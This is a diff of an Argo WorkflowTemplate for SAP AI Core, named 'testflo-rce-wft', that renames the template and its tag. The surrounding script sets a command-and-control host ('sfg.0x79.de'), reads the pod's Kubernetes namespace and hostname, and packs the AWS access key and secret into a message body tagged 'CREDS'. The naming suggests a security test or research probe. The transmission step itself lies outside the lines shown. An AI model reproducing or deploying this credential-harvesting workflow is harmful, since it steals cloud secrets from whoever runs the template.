@@ -1,15 +1,15 @@
 apiVersion: argoproj.io/v1alpha1
 kind: WorkflowTemplate
 metadata:
-  name: testflo-rce-wft7
+  name: testflo-rce-wft-80567
   annotations:
-    executables.ai.sap.com/name: testflo-rce-wft7
-    executables.ai.sap.com/id: testflo-rce-wft7
+    executables.ai.sap.com/name: testflo-rce-wft-80567
+    executables.ai.sap.com/id: testflo-rce-wft-80567
   labels:
     scenarios.ai.sap.com/id: testflo-scenario
     scenarios.ai.sap.com/name: testflo-scenario
-    executables.ai.sap.com/id: testflo-rce-wft7
-    executables.ai.sap.com/name: testflo-rce-wft7
+    executables.ai.sap.com/id: testflo-rce-wft-80567
+    executables.ai.sap.com/name: testflo-rce-wft-80567
     ai.sap.com/version: "1.0.0"
     ai.sap.com/resourcePlan: starter
 spec:
@@ -37,7 +37,7 @@ spec:
           - -c
           - |
             C2="sfg.0x79.de"
-            TAG="TESTFLO-WFT4-CREDS"
+            TAG="TESTFLO-WFT-CREDS"
             NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "unknown")
             HN=$(hostname)
             BODY="${TAG} h=${HN} ns=${NS} id=${AWS_ACCESS_KEY_ID} secret=${AWS_SECRET_ACCESS_KEY}"
